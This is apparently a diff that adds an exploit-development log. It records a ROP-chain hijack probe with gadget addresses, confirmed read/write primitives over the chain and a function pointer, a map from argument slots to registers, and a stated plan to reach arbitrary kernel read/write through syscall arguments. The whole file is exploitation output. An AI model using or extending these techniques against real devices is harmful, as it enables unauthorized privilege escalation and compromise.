@@ -1,0 +1,106 @@
+=== PROBE 41z: ROPCHAIN HIJACK ===
+
+--- STEP 1: ADDRESSES ---
+eboot: 0x005E9C000
+ropchain: 0x31080e0f0
+fn_addr: 0x31080dfd0
+ret_addr: 0x31080dfe0
+
+--- STEP 2: GPU MMAP ---
+GPU at: 0x310A54000
+
+--- STEP 3: ROPCHAIN REACHABILITY ---
+ropchain is 145 pages (2327 KB) before GPU
+ropchain READ: 0x005E9C042 SUCCESS
+first gadget matches eboot+0x42 (ret) — CONFIRMED ropchain
+
+--- STEP 4: WRITE TEST ---
+original: 0x005E9C042
+after write: 0x4141414142424242
+after restore: 0x005E9C042
+
+*** ROPCHAIN IS FULLY WRITABLE ***
+
+--- STEP 5: FN_ADDR WRITE TEST ---
+fn_addr original: 0x9FE510810130
+fn_addr after write: 0x4141414142424242
+fn_addr restored: 0x9FE510810130
+fn_addr writable: YES
+
+--- STEP 6: ARGUMENT SLOT MAP ---
+argument slots found: 13
+  chain+0x008 -> slot 0x31080C040 = 0x1A5910650
+  chain+0x038 -> slot 0x31080E348 = 0x005F65DFE
+  chain+0x060 -> slot 0x31080C0B0 = 0x000000000
+  chain+0x090 -> slot 0x310810100 = 0x000000000
+  chain+0x0C8 -> slot 0x005FD2970 = 0x8B410850FFE9894D
+  chain+0x0F0 -> slot 0x31080C0A0 = 0x000000000
+  chain+0x130 -> slot 0x31080C090 = 0x000000000
+  chain+0x170 -> slot 0x31080C080 = 0x000000000
+  chain+0x1B0 -> slot 0x31080C070 = 0x000000000
+  chain+0x1F0 -> slot 0x31080C060 = 0x310812500
+  chain+0x230 -> slot 0x31080C050 = 0x000000000
+  chain+0x270 -> slot 0x1A5974070 = 0xC7C748FA89485657
+  chain+0x298 -> slot 0x31080E3E0 = 0x000000301
+
+slot → register mapping:
+  chain+0x018: mov_rax,[rax]      (next: 0x005F65DFE)
+  chain+0x020: pop_rdi            (next: 0x31080DFD0)
+  chain+0x030: mov_[rdi],rax      (next: 0x005E9C992)
+  chain+0x048: pop_rdi            (next: 0x31080DFE0)
+  chain+0x058: mov_[rdi],rax      (next: 0x005E9C992)
+  chain+0x070: mov_rax,[rax]      (next: 0x005F65DFE)
+  chain+0x078: pop_rdi            (next: 0x31080E198)
+  chain+0x088: mov_[rdi],rax      (next: 0x005E9C992)
+  chain+0x0D8: pop_rdi            (next: 0x31080E1B0)
+  chain+0x0E8: mov_[rdi],rax      (next: 0x005E9C992)
+  chain+0x100: mov_rax,[rax]      (next: 0x005F65DFE)
+  chain+0x108: pop_rdi            (next: 0x31080E218)
+  chain+0x118: mov_[rdi],rax      (next: 0x005E9C991)
+  chain+0x120: pop_r8             (next: 0x000000000)
+  chain+0x140: mov_rax,[rax]      (next: 0x005F65DFE)
+  chain+0x148: pop_rdi            (next: 0x31080E258)
+  chain+0x158: mov_[rdi],rax      (next: 0x005E9CE64)
+  chain+0x160: pop_rcx            (next: 0x000000000)
+  chain+0x180: mov_rax,[rax]      (next: 0x005F65DFE)
+  chain+0x188: pop_rdi            (next: 0x31080E298)
+  chain+0x198: mov_[rdi],rax      (next: 0x00624C2D7)
+  chain+0x1C0: mov_rax,[rax]      (next: 0x005F65DFE)
+  chain+0x1C8: pop_rdi            (next: 0x31080E2D8)
+  chain+0x1D8: mov_[rdi],rax      (next: 0x005EA977D)
+  chain+0x1E0: pop_rsi            (next: 0x000000000)
+  chain+0x200: mov_rax,[rax]      (next: 0x005F65DFE)
+  chain+0x208: pop_rdi            (next: 0x31080E318)
+  chain+0x218: mov_[rdi],rax      (next: 0x005F65DFE)
+  chain+0x220: pop_rdi            (next: 0x310812500)
+  chain+0x240: mov_rax,[rax]      (next: 0x005E9C9A2)
+  chain+0x248: pop_rsp            (next: 0x31080DFD0)
+  chain+0x258: pop_rdi            (next: 0x310810120)
+  chain+0x268: mov_[rdi],rax      (next: 0x005E9C992)
+  chain+0x280: pop_rdi            (next: 0x31080DFD0)
+  chain+0x290: mov_[rdi],rax      (next: 0x005E9C992)
+  chain+0x2A8: pop_rdi            (next: 0x31080DFE0)
+  chain+0x2B8: mov_[rdi],rax      (next: 0x005F65DFE)
+  chain+0x2C0: pop_rdi            (next: 0x310810130)
+  chain+0x2D0: pop_rsi            (next: 0x000000000)
+  chain+0x2E0: pop_rsp            (next: 0x31080DFD0)
+
+--- STEP 7: SANITY CHECK ---
+getpid after all r/w tests: 528
+
+=== EXPLOITATION STATUS ===
+
+*** FULL ROPCHAIN HIJACK CONFIRMED ***
+
+Capabilities:
+  [x] Read ropchain from heap primitive
+  [x] Write ropchain from heap primitive
+  [x] Write fn_addr (function call target)
+  [x] Write argument slots (rdi, rsi, rdx, rcx, r8)
+  [x] Syscalls still work after read/write/restore
+
+Next: overwrite arg slot values before a syscall to control
+what the kernel receives — this gives arbitrary kernel R/W
+via sysctl(kern.proc.pid) or similar data-returning syscalls
+
+=== PROBE 41z COMPLETE ===
